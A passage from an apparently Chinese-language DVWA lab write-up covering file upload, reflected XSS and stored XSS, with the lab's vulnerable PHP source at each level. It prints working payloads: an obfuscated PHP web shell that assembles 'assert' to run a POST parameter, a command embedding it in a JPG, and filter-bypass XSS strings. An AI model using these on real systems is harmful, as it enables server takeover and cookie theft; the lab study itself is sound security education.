class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以看到源码中添加了过滤，只能上传类型为<code>image/jpeg</code>或<code>image/png</code>，并且文件的大小要小于<code>100000</code>。</p><p>考虑用bp抓包，然后更改<code>Content-Type</code>为<code>image/jpeg</code>来尝试绕过。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200216174846.png" style="zoom: 33%;"><p>成功上传。</p><h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中，需要介绍的函数有</p><table><thead><tr><th>函数</th><th>解释</th></tr></thead><tbody><tr><td>substr(string, start, length)</td><td>在string中，从start处开始截取length长度的字符串返回。</td></tr><tr><td>strrpos(string, find)</td><td>查找find在string中最后出现的位置。</td></tr></tbody></table><p>High等级将上传文件的文件后缀取出来，判断最后一个<code>.</code>后面的后缀是否为<code>jpg</code>、<code>jpeg</code>、<code>png</code>。若不是则无法上传。</p><p>因为最后是检验最后一个点后面的后缀名，因此可以考虑使用<code>0x00</code>截断。</p><p>关于<code>0x00</code>和<code>%00</code>的关系，我们可以在<a href="https://blog.csdn.net/zpy1998zpy/article/details/80545408">安~然</a>的这篇博文上找到答案。</p><p>之后bp时间后发现没有实现，查资料发现是php&lt;5.3.4才可能存在此漏洞。</p><p>之后又尝试了图片马，结合文件包含漏洞进行测试，可上传成功，但是访问时报错，是语法问题，和引号有关。报错内容如下：</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200528174332.png" style="zoom:50%;"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a1</span>=<span class="string">&#x27;ass&#x27;</span>;<span class="variable">$a2</span>=<span class="string">&#x27;ert&#x27;</span>;<span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="variable">$a1</span>.<span class="variable">$a2</span>=&gt;<span class="string">&quot;test&quot;</span>);<span class="variable">$arr1</span>=array_flip(<span class="variable">$arr</span>);<span class="variable">$arr2</span>=<span class="string">&quot;<span class="subst">$arr1</span>[test]&quot;</span>;@<span class="variable">$arr2</span>(<span class="variable">$_POST</span>[shell]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+shell.php/a 3.jpg</span><br></pre></td></tr></table></figure><p>通过hackbar访问，成功，但是通过蚁剑连接的时候出现问题，返回为空。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200530103712.png"></p><h2 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span></span><br><span class="line">    <span class="variable">$target_file</span>   =  md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line">    <span class="variable">$temp_file</span>     = ( ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) );</span><br><span class="line">    <span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpeg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefromjpeg( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagejpeg( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefrompng( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagepng( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( <span class="variable">$img</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line">        <span class="keyword">if</span>( rename( <span class="variable">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class="variable">$target_path</span> . <span class="variable">$target_file</span> ) ) ) &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files</span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( <span class="variable">$temp_file</span> ) )</span><br><span class="line">            unlink( <span class="variable">$temp_file</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们审计源码，发现其中有<code>Anti-CSRF</code>来预防<code>CSRF</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_file</span>   =  md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br></pre></td></tr></table></figure><p>通过这步代码，将目标文件的名字最后改为MD5处理后的名字，后缀改为上传时的最后的后缀。同事临时文件tmp_file也进行相同的处理。</p><p>然后判断上传的后缀和文件类型是否符合图片的格式，符合条件，才进行存储。</p><h1 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS(Reflected)"></a>XSS(Reflected)</h1><h2 id="low-7"><a href="#low-7" class="headerlink" title="low"></a>low</h2><p>我们首先输入1，测试发现，是将我们的输入直接输出在了html中，所以可以尝试写一段脚本进去。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200214160738.png" style="zoom:50%;"><p>成功。。。</p><h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以发现是将输入中存在的<code>&lt;script&gt;</code>更改为空。因此，我们可以输入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(<span class="string">&#x27;1&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>来绕过。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200217160457.png"></p><h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>High相对于Medium，从字符串的匹配，升级成了正则的匹配，只要是顺序是&lt;script，无论中间出现多少的字符，都会被替换为空。</p><p>因此我们可以尝试用其他的标签来绕过。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;&quot;</span> onerror=<span class="string">&quot;alert(&#x27;1&#x27;);&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200217162254.png"></p><h2 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里提供作用的主要是函数<code>htmlspecialchars()</code>，该函数的作用是将一些预定义的字符转换为HTML实体。如：</p><ul><li><code>&amp;</code>：转换为<code>&amp;amp;</code></li><li><code>&quot;</code>：转换为<code>&amp;quot;</code></li><li><code>&#39;</code>：转换为<code>‘</code></li><li><code>&lt;</code>：转换为<code>&amp;lt;</code></li><li><code>&gt;</code>：转换为<code>&amp;gt;</code></li></ul><h1 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS(Stored)"></a>XSS(Stored)</h1><h2 id="low-8"><a href="#low-8" class="headerlink" title="low"></a>low</h2><p>同反射型XSS一样，写入就可以了，下次再访问也可执行。</p><h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>阅读源码，发现对<code>message</code>进行了<code>htmlspecialchars()</code>的调用，将字符串中间的特殊字符全转义为了html实体，因此<code>message</code>中不存在xss注入。但是name中只进行了<code>str_replace()</code>将<code>&lt;script&gt;</code>给过滤掉成了空，因此可以在<code>name</code>中进行注入。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(<span class="string">&#x27;1&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>写入时发现无法输入长字符串，<code>F12</code>打开源码发现</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200217171052.png" style="zoom:50%;"><p>直接手动将maxlength调整为一个大数，如1000。</p><p>然后注入成功。</p><h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 